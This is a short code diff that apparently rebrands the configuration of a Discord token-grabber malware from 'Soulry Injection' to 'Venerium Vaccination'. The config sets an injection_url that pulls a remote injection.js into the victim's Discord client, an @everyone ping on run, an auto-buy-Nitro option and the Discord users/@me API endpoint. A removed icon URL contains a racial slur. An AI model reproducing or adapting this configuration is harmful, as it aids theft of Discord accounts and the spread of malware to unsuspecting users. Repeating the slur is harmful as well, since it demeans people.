@@ -12,9 +12,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Soulry Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/beztpro9/Image-source/main/Nigga-Be-Proud-Of-Your-Color-Gol.png',
-  embed_color: 5639644, 
+  embed_name: 'Venerium Vaccination', 
+  embed_icon: 'https://raw.githubusercontent.com/vilished/image-src/main/175107031.jpeg',
+  embed_color: 0x7289DA, 
   injection_url: 'https://raw.githubusercontent.com/beztpro9/-/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
